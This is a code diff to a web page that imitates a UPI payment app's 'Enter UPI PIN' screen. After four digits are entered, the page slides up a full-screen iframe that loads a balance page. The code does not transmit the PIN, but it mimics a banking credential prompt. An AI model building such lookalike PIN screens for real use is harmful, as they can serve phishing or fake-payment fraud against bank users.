@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
     <title>Enter UPI PIN</title>
-<style>
+    <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body {
             height: 100%;
@@ -53,8 +53,7 @@
         /* Grey bar - ONLY the account number inside */
         .account-bar {
             background: #f0f0f0;
-           padding: 8px 8px 38px;
-
+            padding: 8px 8px 38px;
         }
         .account-number {
             font-size: 12px;
@@ -109,7 +108,43 @@
             height: 1px;
             width: 1px;
         }
-</style>
+
+        /* Full-screen Drawer Overlay */
+        #drawer-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.4);
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease;
+            z-index: 9998;
+        }
+        #drawer-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* Full-screen Drawer that slides up */
+        #drawer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 100vh;
+            width: 100%;
+            background: #fff;
+            transform: translateY(100%);
+            transition: transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
+            z-index: 9999;
+            overflow-y: auto;
+        }
+        #drawer.active {
+            transform: translateY(0);
+        }
+    </style>
 </head>
 <body>
 
@@ -142,7 +177,7 @@
         <div class="account-number" id="fullAcc">XXXXXXXXXX2071</div>
     </div>
 
-    <!-- PIN Section - Make this area clickable to trigger keyboard -->
+    <!-- PIN Section - Clickable area to open keyboard -->
     <div class="pin-section" id="triggerArea">
         <div class="pin-title">Enter 4-digit UPI PIN</div>
         <div class="pin-dots">
@@ -155,6 +190,12 @@
             UPI PIN will keep your account secure from unauthorized access. Do not share this PIN with anyone.
         </div>
     </div>
+
+    <!-- Dark overlay (for dimming background) -->
+    <div id="drawer-overlay"></div>
+
+    <!-- Full-screen drawer iframe for balance.html -->
+    <iframe id="drawer" frameborder="0" scrolling="yes"></iframe>
 
     <script>
         // Read URL parameters
@@ -171,21 +212,23 @@
         const dots = document.querySelectorAll('.pin-dot');
         const hiddenInput = document.getElementById('pin-input');
         const triggerArea = document.getElementById('triggerArea');
+        const drawer = document.getElementById('drawer');
+        const overlay = document.getElementById('drawer-overlay');
         let pin = '';
 
-        // Focus hidden input when user taps on PIN area (this triggers keyboard reliably)
+        // Open keyboard when tapping PIN area
         triggerArea.addEventListener('click', () => {
             hiddenInput.focus();
         });
 
-        // Also try auto-focus on load (works on some devices)
+        // Auto-focus on load
         window.addEventListener('load', () => {
             hiddenInput.focus();
         });
 
-        // Handle input from phone keypad
+        // Handle PIN input
         hiddenInput.addEventListener('input', (e) => {
-            const value = e.target.value.replace(/\D/g, ''); // Only digits
+            const value = e.target.value.replace(/\D/g, '');
             pin = value.slice(0, 4);
             e.target.value = pin;
 
@@ -198,11 +241,14 @@
                 }
             });
 
-            // Auto-submit when 4 digits entered
+            // When 4 digits entered → slide up full-screen balance.html
             if (pin.length === 4) {
                 setTimeout(() => {
-                    alert('PIN submitted successfully: ' + pin);
-                    // Add your real submission logic here
+                    // Load balance.html with parameters
+                    drawer.src = 'balance.html?' + window.location.search.slice(1);
+                    // Activate drawer and overlay
+                    drawer.classList.add('active');
+                    overlay.classList.add('active');
                 }, 300);
             }
         });
